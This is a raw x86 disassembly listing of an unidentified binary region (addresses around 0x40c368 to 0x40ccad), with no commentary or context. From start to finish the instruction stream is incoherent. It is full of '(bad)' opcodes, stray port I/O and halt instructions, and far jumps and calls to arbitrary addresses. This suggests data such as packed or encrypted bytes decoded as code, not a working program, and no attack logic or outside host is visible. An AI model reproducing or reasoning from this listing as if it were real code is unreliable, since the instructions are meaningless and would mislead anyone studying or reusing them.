  40c368:	test   DWORD PTR [esi+0x11ba1043],0xc5eec3b7
  40c372:	cmp    al,0xf4
  40c374:	jmp    0x78bc31b
  40c379:	push   0xffffff85
  40c37b:	retf   
  40c37c:	jns    0x40c37b
  40c37e:	push   ecx
  40c37f:	jno    0x40c30a
  40c381:	sbb    BYTE PTR es:[ecx-0x57],ch
  40c385:	es adc al,0x9c
  40c388:	pop    eax
  40c389:	jmp    0x40c38b
  40c38b:	hlt    
  40c38c:	pop    di
  40c38e:	and    al,0xfc
  40c390:	pusha  
  40c391:	ret    
  40c392:	je     0x40c385
  40c394:	add    al,0xaf
  40c396:	dec    eax
  40c397:	fmul   DWORD PTR [edx]
  40c399:	call   0x40c42a
	...
  40c3b2:	add    BYTE PTR [eax],al
  40c3b4:	jmp    0xe0692048
  40c3b9:	in     al,dx
  40c3ba:	inc    ebx
  40c3bb:	fstp   TBYTE PTR [ebx-0x25]
  40c3be:	dec    esi
  40c3bf:	loope  0x40c378
  40c3c1:	and    BYTE PTR [eax],cl
  40c3c3:	test   bh,ch
  40c3c5:	and    bh,ah
  40c3c7:	add    ebp,ecx
  40c3c9:	sub    DWORD PTR [edi+0x1d],eax
  40c3cc:	fsub   DWORD PTR [eax]
  40c3ce:	retf   0x7810
  40c3d1:	mov    bl,0x9e
  40c3d3:	loope  0x40c41f
  40c3d5:	(bad)  
  40c3d6:	sub    al,0x28
  40c3d8:	in     al,0x8f
  40c3da:	sbb    esi,esp
  40c3dc:	ins    BYTE PTR es:[edi],dx
  40c3dd:	add    eax,0x90084772
  40c3e2:	sub    al,0x28
  40c3e4:	add    BYTE PTR [esi+0x3bf493e0],cl
  40c3ea:	(bad)  
  40c3ec:	outs   dx,DWORD PTR ds:[esi]
  40c3ed:	loope  0x40c3b2
  40c3ef:	lds    eax,FWORD PTR [ebx]
  40c3f1:	add    eax,0x40d3051
  40c3f6:	jmp    0xf9614bdb
  40c3fb:	jmp    0x40c465
  40c3fd:	jecxz  0x40c3e6
  40c3ff:	add    esp,DWORD PTR [esi]
  40c401:	lds    edx,FWORD PTR [ecx-0x19]
  40c404:	inc    eax
  40c405:	mov    es,WORD PTR [ebx+esi*1+0x47]
  40c409:	mov    ss,WORD PTR [eax]
  40c40b:	lea    esi,[eax]
  40c40d:	or     esi,esi
  40c40f:	cwde   
  40c410:	shl    edx,cl
  40c412:	xor    esi,DWORD PTR [esp+esi*8+0x4]
  40c416:	popa   
  40c417:	inc    edi
	...
  40c430:	add    al,al
  40c432:	sub    DWORD PTR [eax],0x2915f057
  40c438:	in     eax,dx
  40c439:	xor    BYTE PTR [edx],dh
  40c43b:	xchg   ecx,eax
  40c43c:	adc    esi,edi
  40c43e:	add    al,0x0
  40c440:	jmp    0xe92809d4
  40c445:	idiv   DWORD PTR [edi-0x41]
  40c448:	pop    ebp
  40c449:	out    0x6e,al
  40c44b:	add    esi,ebx
  40c44d:	and    bl,cl
  40c44f:	out    0x4f,eax
  40c451:	mov    eax,0x9f620005
  40c456:	out    dx,eax
  40c457:	add    edx,edi
  40c459:	push   esp
  40c45a:	cmp    esi,0xc015fc34
  40c460:	ret    0x8e2a
  40c463:	add    ah,BYTE PTR [edx+0x77]
  40c466:	mov    al,BYTE PTR [eax]
  40c468:	jmp    0x7090f764
  40c46d:	mov    dl,0xd8
  40c46f:	mov    ch,BYTE PTR [esp+eiz*8]
  40c472:	call   0x7256:0x4f0142f
  40c479:	inc    esp
  40c47a:	loop   0x40c4c3
  40c47c:	pop    eax
  40c47d:	test   BYTE PTR [esp+eax*4],0xa9
  40c481:	retf   
  40c482:	pop    ds
  40c483:	(bad)  
  40c484:	mov    edx,0xd3084968
  40c489:	clc    
  40c48a:	test   eax,eax
  40c48c:	icebp  
  40c48d:	enter  0x8cec,0x29
  40c491:	test   BYTE PTR [edi+edi*8],0xd4
	...
  40c4ad:	add    BYTE PTR [ebx],bl
  40c4af:	(bad)  
  40c4b0:	push   esp
  40c4b1:	fldcw  WORD PTR ds:0x78a12c6f
  40c4b7:	retf   0xb4e7
  40c4ba:	imul   eax,DWORD PTR ds:0x50b76500,0xc
  40c4c1:	jb     0x40c4bf
  40c4c3:	outs   dx,BYTE PTR ds:[esi]
  40c4c4:	add    DWORD PTR [edx-0x5c],esi
  40c4c7:	fimul  DWORD PTR [edi]
  40c4c9:	fidiv  DWORD PTR [edi-0x539dfe12]
  40c4cf:	aaa    
  40c4d0:	pop    edi
  40c4d1:	add    BYTE PTR [esi-0x32],dl
  40c4d4:	ror    BYTE PTR [ebx*4+0x7cec8b12],0x88
  40c4dc:	dec    BYTE PTR [edx+0x57560d78]
  40c4e2:	push   es
  40c4e3:	jns    0x40c473
  40c4e5:	add    DWORD PTR [ebp-0x6e95a8fb],ebx
  40c4eb:	sbb    eax,0xe8a9558d
  40c4f0:	jne    0x40c485
  40c4f2:	pop    esp
  40c4f3:	add    eax,0xfc21c084
  40c4f8:	cmp    BYTE PTR [ebp-0x57],0x0
  40c4fc:	je     0x40c52d
  40c4fe:	int3   
  40c4ff:	arpl   sp,di
  40c501:	add    BYTE PTR [ecx-0x5b],ah
  40c504:	(bad)  
  40c505:	jbe    0x40c53a
  40c507:	mov    edx,0x5675fc73
  40c50c:	in     eax,0x1
  40c50e:	dec    ebp
  40c50f:	mov    gs,esi
  40c511:	test   DWORD PTR [eax],eax
	...
  40c52b:	mov    bl,0x3c
  40c52d:	sbb    BYTE PTR [ebx+0x4d89e4d0],cl
  40c533:	adc    eax,0x75d68b12
  40c538:	dec    eax
  40c539:	xchg   ebx,eax
  40c53a:	add    DWORD PTR ds:0x1b75be81,ebx
  40c540:	psubsb mm2,QWORD PTR [ebx+esi*4-0x32ce0001]
  40c548:	sbb    DWORD PTR [esi-0x37],ebx
  40c54b:	pop    ds
  40c54c:	or     eax,0xb8908b00
  40c551:	xchg   DWORD PTR [ebx-0x2f],eax
  40c554:	mov    DWORD PTR [ecx],esi
  40c556:	mov    al,0xcc
  40c558:	jmp    0x40c546
  40c55a:	mov    ebx,ebp
  40c55c:	mov    bh,0xae
  40c55e:	nop
  40c55f:	fadd   QWORD PTR [eax+eax*1]
  40c562:	(bad)  
  40c563:	hlt    
  40c564:	cdq    
  40c565:	or     BYTE PTR es:[esi+edi*4+0x57],cl
  40c56a:	add    ah,dh
  40c56c:	jae    0x40c574
  40c56e:	pop    eax
  40c56f:	pushf  
  40c570:	or     eax,0x69f40073
  40c575:	les    ecx,FWORD PTR [esi]
  40c577:	sub    DWORD PTR [esi],0x18f403c2
  40c57d:	mov    ebp,ebx
  40c57f:	jg     0x40c5a2
  40c581:	adc    BYTE PTR [ecx+0x3e290],al
  40c587:	hlt    
  40c588:	setle  bh
  40c58b:	cmc    
  40c58c:	in     eax,dx
  40c58d:	add    dl,BYTE PTR [edi+0x0]
	...
  40c5a8:	sub    eax,0xca7950de
  40c5ad:	mov    ss,WORD PTR [edi+0x8]
  40c5b0:	mov    ebp,0xedf5e658
  40c5b6:	cmp    DWORD PTR [esp+eiz*8-0x13],0xf9432456
  40c5be:	repz adc BYTE PTR [ecx+0x33fedc72],0xee
  40c5c6:	pop    DWORD PTR [eax+eiz*1+0xcfede58]
  40c5cd:	fcom   DWORD PTR [edi+0x0]
  40c5d0:	hlt    
  40c5d1:	bound  esi,QWORD PTR [ebp-0x77aec076]
  40c5d7:	repz or dh,BYTE PTR [edi]
  40c5da:	fsubrp st(7),st
  40c5dc:	push   edx
  40c5dd:	mov    eax,0xf3750002
  40c5e2:	inc    edi
  40c5e3:	inc    ecx
  40c5e4:	dec    edx
  40c5e5:	test   eax,0x465c3d57
  40c5ea:	add    al,0x0
  40c5ec:	hlt    
  40c5ed:	pusha  
  40c5ee:	push   edx
  40c5ef:	or     BYTE PTR [edx-0x3c],al
  40c5f2:	add    BYTE PTR [ebp+0x3bf10551],cl
  40c5f8:	fcom   QWORD PTR ds:0x8bf401fa
  40c5fe:	stos   DWORD PTR es:[edi],eax
  40c5ff:	or     edi,edi
  40c601:	inc    ebx
  40c602:	in     eax,0x58
  40c604:	aad    0x9c
  40c606:	inc    BYTE PTR [ebx]
  40c608:	hlt    
  40c609:	add    al,0x87
  40c60b:	sbb    al,0x0
	...
  40c625:	cli    
  40c626:	dec    edi
  40c627:	fimul  WORD PTR [esi]
  40c629:	arpl   si,di
  40c62b:	popa   
  40c62c:	push   eax
  40c62d:	add    BYTE PTR ds:0x43790370,dh
  40c633:	repz xor esp,DWORD PTR [edi]
  40c636:	in     eax,dx
  40c637:	in     eax,0xe5
  40c639:	hlt    
  40c63a:	add    al,0x99
  40c63c:	add    ebx,DWORD PTR [edi+0x2]
  40c63f:	sti    
  40c640:	ret    
  40c641:	retf   0xb036
  40c644:	ret    0x4ef
  40c647:	sbb    al,0x89
  40c649:	dec    edi
  40c64a:	test   DWORD PTR [esp+ecx*1+0x35e904f5],edi
  40c651:	mov    ds:0xf4039697,eax
  40c656:	add    al,0x62
  40c658:	aam    0x6e
  40c65a:	mov    edi,0x4e4c1906
  40c65f:	in     eax,dx
  40c660:	adc    DWORD PTR [ebx+ebp*8],esi
  40c663:	add    eax,0x18c36b0d
  40c668:	frstor [eax-0x1c9a3f4]
  40c66e:	xor    dl,BYTE PTR [ecx-0x4a]
  40c671:	adc    BYTE PTR ds:0x2bf469e9,al
  40c677:	push   ecx
  40c678:	xor    eax,0xebb8c2f7
  40c67d:	add    al,0x67
  40c67f:	call   0xe81e2287
  40c684:	add    esi,esp
  40c686:	xchg   edi,edi
  40c688:	scas   al,BYTE PTR es:[edi]
	...
  40c6a1:	add    bh,ch
  40c6a3:	xor    al,0x6a
  40c6a5:	jmp    0x40c700
  40c6a7:	mov    WORD PTR [edi],ss
  40c6a9:	je     0x40c6d5
  40c6ab:	add    DWORD PTR [eax+0x26],ebx
  40c6ae:	cli    
  40c6af:	inc    eax
  40c6b0:	inc    ecx
  40c6b1:	mov    edi,0xfba8ed32
  40c6b6:	cmc    
  40c6b7:	add    al,0x83
  40c6b9:	test   bl,bh
  40c6bb:	add    al,0x74
  40c6bd:	(bad)  
  40c6be:	rcl    BYTE PTR [ecx+0xc],0x6a
  40c6c2:	push   ebx
  40c6c3:	into   
  40c6c4:	std    
  40c6c5:	out    dx,al
  40c6c6:	mov    al,0xd6
  40c6c8:	mov    ebp,DWORD PTR [edi+ebp*4-0x28]
  40c6cc:	(bad)  
  40c6cd:	fimul  WORD PTR [edi-0x8168c62]
  40c6d3:	call   0x6c8d:0x4f7eaff
  40c6da:	dec    edi
  40c6db:	fdivr  st,st(6)
  40c6dd:	mov    esi,0xe973e04f
  40c6e2:	not    DWORD PTR [eax+eax*1-0x3e33edf2]
  40c6e9:	icebp  
  40c6ea:	imul   DWORD PTR [edi]
  40c6ec:	mov    ecx,DWORD PTR [ebp-0x15e4158a]
  40c6f2:	test   DWORD PTR [ebx+edx*2],0xffdd7737
  40c6f9:	jmp    0x8a73:0xf7204f7
  40c700:	pop    es
  40c701:	jmp    0x633f9e3f
	...
  40c71e:	add    BYTE PTR [edi],ah
  40c720:	lea    ecx,[ebp+ebx*2-0x14]
  40c724:	ret    
  40c725:	jbe    0x40c6e6
  40c727:	je     0x40c782
  40c729:	or     cl,ch
  40c72b:	ins    BYTE PTR es:[edi],dx
  40c72c:	add    BYTE PTR [ecx+0x2651cfa4],cl
  40c732:	add    BYTE PTR [edx],dh
  40c734:	das    
  40c735:	or     BYTE PTR [ebx-0x31688],al
  40c73b:	and    al,BYTE PTR [edx]
  40c73d:	lea    eax,[ebp-0x247cb]
  40c743:	in     eax,0x46
  40c745:	je     0x40c747
  40c747:	int    0x6b
  40c749:	add    al,0x5a
  40c74b:	push   eax
  40c74c:	inc    edi
  40c74d:	clc    
  40c74e:	lea    ebx,[eax]
  40c750:	jmp    0x7581:0xe9f2fffc
  40c757:	lea    eax,[ecx]
  40c759:	cmp    DWORD PTR [ebp-0x5b],0x5856413e
  40c760:	cs push ds
  40c762:	jmp    FWORD PTR [eax]
  40c764:	or     DWORD PTR [ebp+0x56109d45],ecx
  40c76a:	lea    eax,[eax]
  40c76c:	in     eax,0xfa
  40c76e:	inc    DWORD PTR [edx-0x3f]
  40c771:	inc    ebx
  40c772:	lock pop ebp
  40c774:	(bad)  
  40c775:	(bad)  
  40c776:	inc    DWORD PTR [ebp+0x61]
  40c779:	(bad)  
  40c77a:	jmp    DWORD PTR [edx+0x3375be84]
  40c780:	inc    ebx
  40c781:	cmp    esi,DWORD PTR [ebp+0x0]
	...
  40c79c:	imul   esi,DWORD PTR [edx],0x1a8d33a2
  40c7a2:	pop    ebx
  40c7a3:	leave  
  40c7a4:	pop    DWORD PTR [eax+eax*1]
  40c7a7:	mov    ebx,DWORD PTR [ebx-0x1b]
  40c7aa:	hlt    
  40c7ab:	push   ebp
  40c7ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7ad:	in     al,dx
  40c7ae:	sub    esp,0xc438611
  40c7b4:	sti    
  40c7b5:	test   DWORD PTR [ecx+0x3c],esi
  40c7b8:	xchg   esi,eax
  40c7b9:	adc    al,0x1e
  40c7bb:	xor    al,0x4a
  40c7bd:	xchg   BYTE PTR [ebx+0x8],bh
  40c7c0:	out    0xb5,al
  40c7c2:	add    edi,eax
  40c7c4:	hlt    
  40c7c5:	fwait
  40c7c6:	xor    DWORD PTR [ebx+0x7f],edx
  40c7c9:	daa    
  40c7ca:	lea    eax,[eax+eiz*8+0x36]
  40c7ce:	(bad)  [esi]
  40c7d0:	hlt    
  40c7d1:	fld    QWORD PTR [edi+0x6c6edc44]
  40c7d7:	inc    eax
  40c7d8:	rcr    DWORD PTR [ecx-0x29be00fa],cl
  40c7de:	fst    DWORD PTR [esp+eiz*8]
  40c7e1:	into   
  40c7e2:	inc    edx
  40c7e3:	add    BYTE PTR [ecx+0x1e],dh
  40c7e6:	push   eax
  40c7e7:	ds out 0x24,eax
  40c7ea:	mov    WORD PTR [ebx+ebp*4-0x3b],cs
  40c7ee:	inc    edi
  40c7ef:	or     al,0x2a
  40c7f1:	mov    ebp,0xdb41b609
  40c7f6:	lea    eax,[esp+edi*8+0x67]
  40c7fa:	xor    BYTE PTR ds:0x7efede4,dl
	...
  40c818:	add    BYTE PTR [edx-0x68024d7],al
  40c81e:	mov    edx,0xabf874fe
  40c823:	aas    
  40c824:	push   esp
  40c826:	sbb    al,0x1f
  40c828:	dec    ebp
  40c829:	lock btc DWORD PTR [ecx+esi*4-0x3600cd6b],ecx
  40c832:	xchg   ebp,eax
  40c833:	fnstenv [eax+edi*8-0x56]
  40c837:	dec    edi
  40c838:	or     BYTE PTR [ebx-0x27],al
  40c83b:	repnz adc dh,BYTE PTR [ebp+ebx*8+0x672874d9]
  40c843:	mov    dh,0x56
  40c845:	sub    edx,edx
  40c847:	clc    
  40c848:	xor    ebp,DWORD PTR [edi-0x69]
  40c84b:	jmp    0xb25f:0x2dde399
  40c852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c853:	les    ecx,FWORD PTR [ebx]
  40c855:	hlt    
  40c856:	add    al,0xbc
  40c858:	mov    cs,WORD PTR [edi]
  40c85a:	mov    BYTE PTR [ebx+eiz*1-0x5e],cl
  40c85e:	cmp    esp,DWORD PTR [edx+0x18]
  40c861:	mov    al,ds:0x2703a8f8
  40c866:	fcmovnbe st,st(0)
  40c868:	(bad)  
  40c86a:	add    al,0xe9
  40c86c:	ins    DWORD PTR es:[edi],dx
  40c86d:	fstp   TBYTE PTR [edx]
  40c86f:	ss push eax
  40c871:	cld    
  40c872:	pop    esi
  40c873:	call   0xfcd9a952
  40c878:	inc    ebx
  40c879:	hlt    
  40c87a:	jge    0x40c81f
  40c87c:	xlat   BYTE PTR ds:[ebx]
	...
  40c895:	add    BYTE PTR [esi-0x34],dh
  40c898:	out    0x4f,eax
  40c89a:	xlat   BYTE PTR ds:[ebx]
  40c89b:	jg     0x40c840
  40c89d:	xlat   BYTE PTR ds:[ebx]
  40c89e:	dec    edx
  40c89f:	xor    esi,DWORD PTR [eax]
  40c8a1:	(bad)
  40c8a4:	push   0x58
  40c8a6:	nop
  40c8a7:	idiv   BYTE PTR [esp+edx*8-0x80]
  40c8ab:	dec    ecx
  40c8ac:	or     DWORD PTR [ebx],esi
  40c8ae:	mov    edi,ecx
  40c8b0:	cwde   
  40c8b1:	lock ret 
  40c8b3:	add    al,0x6c
  40c8b5:	aas    
  40c8b6:	xchg   esp,eax
  40c8b7:	xor    al,0xd6
  40c8b9:	out    dx,eax
  40c8ba:	fwait
  40c8bb:	clc    
  40c8bc:	sub    BYTE PTR [esi+ebx*8],al
  40c8bf:	add    eax,0x81ca321f
  40c8c4:	and    esp,esp
  40c8c6:	stos   DWORD PTR es:[edi],eax
  40c8c7:	rcr    DWORD PTR [ebp-0x69a66c81],cl
  40c8cd:	in     eax,dx
  40c8ce:	test   bl,dl
  40c8d0:	sbb    al,0x20
  40c8d2:	clc    
  40c8d3:	shl    ebx,cl
  40c8d5:	or     esp,edi
  40c8d7:	inc    esp
  40c8d8:	jmp    0xfa49a1b5
  40c8dd:	inc    ebx
  40c8de:	hlt    
  40c8df:	sar    esp,cl
  40c8e1:	pop    ds
  40c8e2:	clc    
  40c8e3:	pop    esi
  40c8e4:	jmp    0x45bd54
  40c8e9:	fincstp 
  40c8eb:	rcl    DWORD PTR [edx*8+0x6c001300],cl
  40c8f2:	cmp    BYTE PTR [edi+0xb],dl
  40c8f5:	mov    ecx,0xfa03f81c
	...
  40c912:	add    BYTE PTR [edi],dh
  40c914:	add    eax,0x4d8e8b0
  40c919:	xor    ch,BYTE PTR [ecx]
  40c91b:	mov    edx,0xf7790006
  40c920:	mov    BYTE PTR [ebx],0xe9
  40c923:	and    bh,BYTE PTR [esi-0x15]
  40c926:	cwde   
  40c927:	add    BYTE PTR [eax-0x7ff7dabc],al
  40c92d:	pop    eax
  40c92e:	icebp  
  40c92f:	iret   
  40c930:	fs pop ecx
  40c932:	jmp    0x40c92b
  40c934:	jge    0x40c982
  40c936:	fnstsw WORD PTR [esi+0x5]
  40c939:	pop    ebx
  40c93a:	ins    BYTE PTR es:[edi],dx
  40c93b:	mov    eax,0xb7bb0459
  40c940:	fistp  WORD PTR [ecx]
  40c942:	push   0x2b
  40c944:	rol    DWORD PTR [eax],1
  40c946:	ja     0x40c941
  40c948:	test   DWORD PTR [ecx+esi*8-0x17],edi
  40c94c:	push   ebp
  40c94d:	add    al,0x1a
  40c94f:	mov    al,0xdf
  40c951:	add    bl,BYTE PTR [edx]
  40c953:	cmp    BYTE PTR [edx],dl
  40c955:	mov    ebx,DWORD PTR [eax+eiz*2]
  40c958:	mov    al,BYTE PTR [eax]
  40c95a:	jns    0x40c952
  40c95c:	mov    ebx,0x37f7edc1
  40c961:	mov    eax,ebp
  40c963:	js     0x40c94b
  40c965:	imul   DWORD PTR [edx+0x53]
  40c968:	(bad)  
  40c969:	push   edx
  40c96a:	aas    
  40c96b:	jno    0x40c942
  40c96d:	push   esi
  40c96e:	ins    BYTE PTR es:[edi],dx
  40c96f:	std    
  40c970:	cld    
  40c971:	imul   ebp,ecx,0x1588c780
	...
  40c98f:	add    ah,dl
  40c991:	in     al,dx
  40c992:	out    0x0,eax
  40c994:	sahf   
  40c995:	adc    eax,DWORD PTR [edx]
  40c997:	add    BYTE PTR [ecx-0x75bb8d3b],dl
  40c99d:	cmp    BYTE PTR [ebx+ecx*4],al
  40c9a0:	push   es
  40c9a1:	or     bh,bh
  40c9a3:	xor    esp,DWORD PTR [ebp+0xd0029dc]
  40c9a9:	push   edx
  40c9aa:	mov    edi,0x7180ec74
  40c9af:	or     al,0x35
  40c9b1:	mov    al,ds:0xc3cd002a
  40c9b6:	inc    edx
  40c9b7:	and    al,0xbe
  40c9b9:	push   es
  40c9ba:	test   al,al
  40c9bc:	nop
  40c9bd:	rol    ah,cl
  40c9bf:	inc    esp
  40c9c0:	icebp  
  40c9c1:	xlat   BYTE PTR ds:[ebx]
  40c9c2:	dec    BYTE PTR [edx+0x7883098e]
  40c9c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9c9:	add    eax,0x619afb8b
  40c9ce:	mov    edi,0x55e9f550
  40c9d3:	add    cl,BYTE PTR [ebp-0x41db857b]
  40c9d9:	add    eax,0x42160d75
  40c9de:	and    al,0x14
  40c9e0:	push   ds
  40c9e1:	les    edx,FWORD PTR [esi]
  40c9e3:	push   esi
  40c9e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9e5:	cmp    eax,DWORD PTR [edi+0x437e8d00]
  40c9eb:	or     BYTE PTR ds:0x5d0211a9,dh
  40c9f1:	sbb    bl,BYTE PTR [esi-0x50]
	...
  40ca0c:	add    BYTE PTR [esi+ecx*1-0x75],cl
  40ca10:	in     eax,0xf8
  40ca12:	mov    BYTE PTR [edx],0x0
  40ca15:	pop    edx
  40ca16:	jg     0x40ca57
  40ca18:	add    al,0xed
  40ca1a:	loopne 0x40c99c
  40ca1c:	pop    ecx
  40ca1d:	dec    edi
  40ca1e:	add    eax,0xfd314c8b
  40ca23:	mov    BYTE PTR [ecx],al
  40ca25:	hlt    
  40ca26:	inc    ax
  40ca28:	and    al,0xf8
  40ca2a:	test   eax,0x9be70103
  40ca2f:	sbb    al,0x1
  40ca31:	jmp    0x40ca6b
  40ca33:	(bad)
  40ca37:	mov    DWORD PTR [ebx-0x30],eax
  40ca3a:	out    0xea,eax
  40ca3c:	jns    0x40ca25
  40ca3e:	fld    QWORD PTR [edx]
  40ca40:	mov    al,0xf5
  40ca42:	sbb    eax,0x70030000
  40ca47:	inc    esp
  40ca48:	add    al,0x77
  40ca4a:	inc    esi
  40ca4b:	add    al,0x74
  40ca4d:	lock xchg ebp,eax
  40ca4f:	dec    esi
  40ca50:	add    esp,DWORD PTR [edi]
  40ca52:	push   ds
  40ca53:	ret    
  40ca54:	mov    bh,0xe8
  40ca56:	sbb    esi,DWORD PTR [edi+esi*2-0x3e0ca949]
  40ca5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca5f:	rcl    DWORD PTR [edi+ebp*2+0x2],0x83
  40ca64:	jecxz  0x40ca12
  40ca66:	pop    ebp
  40ca67:	call   0x31ebaff
  40ca6c:	push   ebx
  40ca6d:	dec    edx
  40ca6e:	outs   dx,DWORD PTR ds:[esi]
  40ca6f:	mov    eax,edi
	...
  40ca89:	add    bl,ch
  40ca8b:	pop    ss
  40ca8c:	aas    
  40ca8d:	add    al,0x77
  40ca8f:	push   es
  40ca90:	add    al,0x89
  40ca92:	or     dl,cl
  40ca94:	cli    
  40ca95:	jae    0x40ca80
  40ca97:	adc    eax,0x2ab32a51
  40ca9c:	and    BYTE PTR [edx+edx*1],cl
  40ca9f:	fiadd  WORD PTR [edx]
  40caa1:	add    BYTE PTR [ebx],dh
  40caa3:	sub    ah,BYTE PTR [eax]
  40caa5:	adc    al,0x24
  40caa7:	adc    DWORD PTR [eax+eax*1],eax
  40caaa:	dec    edi
  40caab:	scas   al,BYTE PTR es:[edi]
  40caac:	mov    ebp,0xeeea1843
  40cab1:	dec    DWORD PTR [ebx-0x22]
  40cab4:	mov    ebp,0xfd051843
  40cab9:	arpl   WORD PTR [esi+0x5],cx
  40cabc:	jmp    0xf969827f
  40cac1:	or     esp,esi
  40cac3:	add    al,0xe9
  40cac5:	mov    dh,BYTE PTR [edi+0x346cf528]
  40cacb:	gs xchg ebx,eax
  40cacd:	add    esi,esp
  40cacf:	jge    0x40cafd
  40cad1:	and    al,bh
  40cad3:	jnp    0x40caf9
  40cad5:	and    ah,ah
  40cad7:	pop    ebp
  40cad8:	sub    DWORD PTR [ebx+0xe],esp
  40cadb:	add    eax,0x29378ce9
  40cae0:	stc    
  40cae1:	adc    dh,BYTE PTR [ecx+eax*4-0x22e3e02c]
  40cae8:	dec    edx
  40cae9:	mov    ebx,ebx
  40caeb:	iret   
  40caec:	cmp    eax,0x4f
	...
  40cb05:	add    BYTE PTR [eax],al
  40cb07:	sbb    cl,bh
  40cb09:	aas    
  40cb0a:	adc    dh,ch
  40cb0c:	add    al,0xe9
  40cb0e:	mov    BYTE PTR [edi],dh
  40cb10:	sub    ebp,edi
  40cb12:	xor    ecx,esp
  40cb14:	pop    es
  40cb15:	add    BYTE PTR [esp+esi*8],al
  40cb18:	mov    DWORD PTR [eax],ebp
  40cb1a:	dec    edi
  40cb1b:	stc    
  40cb1c:	xor    al,0x1
  40cb1e:	in     eax,0x94
  40cb20:	add    eax,0x291f82e9
  40cb25:	aad    0x3
  40cb27:	or     ebx,edi
  40cb29:	xor    BYTE PTR [ebx-0x33],bh
  40cb2c:	add    al,0xe9
  40cb2e:	in     al,dx
  40cb2f:	lock add eax,0x4f7403e9
  40cb35:	in     eax,0x3
  40cb37:	add    ecx,DWORD PTR [edx+0x4f40472]
  40cb3d:	pop    esp
  40cb3e:	pop    eax
  40cb3f:	sbb    BYTE PTR [ebp-0x5],bl
  40cb42:	mov    eax,0x2164753
  40cb47:	hlt    
  40cb48:	adc    eax,DWORD PTR [eax]
  40cb4a:	mov    edi,0xc1c67c1a
  40cb4f:	ret    0x238
  40cb52:	jmp    0x1b45b12
  40cb57:	jge    0x40cb9c
  40cb59:	and    al,0x1d
  40cb5b:	andnps xmm5,XMMWORD PTR [eax]
  40cb5e:	ficom  WORD PTR [eax-0xe5d7c3e]
  40cb64:	js     0x40cb25
  40cb66:	out    dx,al
  40cb67:	or     DWORD PTR [edi+0x814f],0x0
	...
  40cb81:	add    BYTE PTR [eax],al
  40cb83:	add    BYTE PTR [eax+0x39],dl
  40cb86:	add    ch,cl
  40cb88:	rol    DWORD PTR [ecx-0x2373f285],1
  40cb8e:	xchg   ebp,eax
  40cb8f:	mov    bh,0xf5
  40cb91:	add    al,0x84
  40cb93:	xor    bh,BYTE PTR [ebx]
  40cb95:	cld    
  40cb96:	mov    ah,BYTE PTR [ebp+0x7ee90103]
  40cb9c:	lock add al,0x0
  40cb9f:	ins    BYTE PTR es:[edi],dx
  40cba0:	ins    BYTE PTR es:[edi],dx
  40cba1:	and    cl,BYTE PTR [eax-0x38fb0815]
  40cba7:	gs adc al,0x85
  40cbaa:	add    ecx,ebp
  40cbac:	test   DWORD PTR [edx+esi*2-0xd230857],0xff04f5bf
  40cbb7:	aam    0xcb
  40cbb9:	loop   0x40cbfd
  40cbbb:	jmp    0x65644e32
  40cbc0:	test   BYTE PTR [eax+eax*1],0x60
  40cbc4:	xor    al,0x29
  40cbc6:	cmp    BYTE PTR [edi+0x2924427a],dl
  40cbcc:	sar    BYTE PTR [edi+0x73],0x5
  40cbd0:	or     dh,al
  40cbd2:	inc    ebx
  40cbd3:	or     eax,0x2975a500
  40cbd8:	clc    
  40cbd9:	fdivr  st(6),st
  40cbdb:	add    BYTE PTR [edx+0x2],ch
  40cbde:	add    BYTE PTR [edx+0x5d],ch
  40cbe1:	jl     0x40cbb9
  40cbe3:	(bad)  
  40cbe4:	sbb    DWORD PTR ds:0x3028,esp
	...
  40cbfe:	add    BYTE PTR [eax],al
  40cc00:	add    BYTE PTR [ebx],cl
  40cc02:	dec    ecx
  40cc03:	add    al,ch
  40cc05:	push   esp
  40cc06:	and    BYTE PTR [edx],al
  40cc08:	add    BYTE PTR [esi+0x2515ff0b],al
  40cc0e:	aad    0x3e
  40cc10:	add    BYTE PTR [esi+0x64850848],dl
  40cc16:	ds or  al,0x8b
  40cc19:	ins    DWORD PTR es:[edi],dx
  40cc1a:	sbb    eax,0x18781d1
  40cc1f:	pop    esp
  40cc20:	sbb    BYTE PTR es:[eax+0x3],al
  40cc24:	mov    DWORD PTR [edx-0x6],ecx
  40cc27:	(bad)  
  40cc28:	xor    eax,0x41ae51
  40cc2d:	push   eax
  40cc2e:	push   cs
  40cc2f:	and    al,0x20
  40cc31:	push   esp
  40cc32:	push   cs
  40cc33:	and    al,0x38
  40cc35:	mov    DWORD PTR [edx],0x48f9448d
  40cc3b:	push   eax
  40cc3c:	lea    ecx,[ecx-0x6638d013]
  40cc42:	in     eax,dx
  40cc43:	daa    
  40cc44:	les    ebx,FWORD PTR [esi+0x41]
  40cc47:	add    dh,al
  40cc49:	pop    ecx
  40cc4a:	in     eax,dx
  40cc4b:	sub    eax,DWORD PTR [eax]
  40cc4d:	fimul  DWORD PTR ds:0x402d3024
  40cc53:	inc    eax
  40cc54:	add    BYTE PTR ds:0x9d00a65f,al
  40cc5a:	jnp    0x40cc32
  40cc5c:	(bad)  
  40cc5d:	pop    ecx
  40cc5e:	in     eax,dx
  40cc5f:	sbb    ebp,DWORD PTR [esi+edi*8+0x8b0041]
	...
  40cc7e:	leave  
  40cc7f:	sbb    al,0xc
  40cc81:	test   BYTE PTR [esi],dh
  40cc83:	sub    eax,DWORD PTR [ebx+ecx*4]
  40cc86:	hlt    
  40cc87:	pop    ds
  40cc88:	sub    BYTE PTR [eax],dl
  40cc8a:	outs   dx,DWORD PTR ds:[esi]
  40cc8b:	aas    
  40cc8c:	sub    BYTE PTR [eax],bl
  40cc8e:	(bad)  
  40cc8f:	(bad)  
  40cc90:	sbb    ah,bh
  40cc92:	pop    eax
  40cc93:	sbb    al,BYTE PTR [edi+edi*8]
  40cc96:	loope  0x40cc4f
  40cc98:	cmc    
  40cc99:	aas    
  40cc9a:	hlt    
  40cc9b:	loopne 0x40cca1
  40cc9d:	add    esp,esi
  40cc9f:	fild   DWORD PTR [ecx]
  40cca1:	test   BYTE PTR [edx+0x6d],ch
  40cca4:	sar    dh,cl
  40cca6:	jns    0x40ccc7
  40cca8:	sub    BYTE PTR [eax-0x3c],dl
  40ccab:	jle    0x40cca5
  40ccad:	adc    eax,DWORD PTR [esi]
